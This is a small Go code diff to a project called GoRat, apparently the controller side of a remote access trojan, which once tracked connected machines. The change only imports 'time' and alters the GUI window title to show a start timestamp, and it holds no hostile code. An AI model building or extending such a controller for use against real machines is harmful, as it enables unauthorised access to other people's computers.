@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"net/http"
+	"time"
 
 	"github.com/NotKatsu/GoRat/modules/database"
 	"github.com/NotKatsu/GoRat/modules/endpoints"
@@ -24,7 +25,7 @@ func APIHandler() {
 }
 
 func GUIHandler() {
-	window := go_rat.NewMasterWindow(fmt.Sprintf("GoRat - %d Connected Machines", len(database.GetConnections())), 950, 550, go_rat.MasterWindowFlagsNotResizable)
+	window := go_rat.NewMasterWindow(fmt.Sprintf("GoRat - Started at %v", time.Now().Format("15:04:05 (2006-01-02)")), 950, 550, go_rat.MasterWindowFlagsNotResizable)
 	window.Run(windows.MainWindow)
 }
 
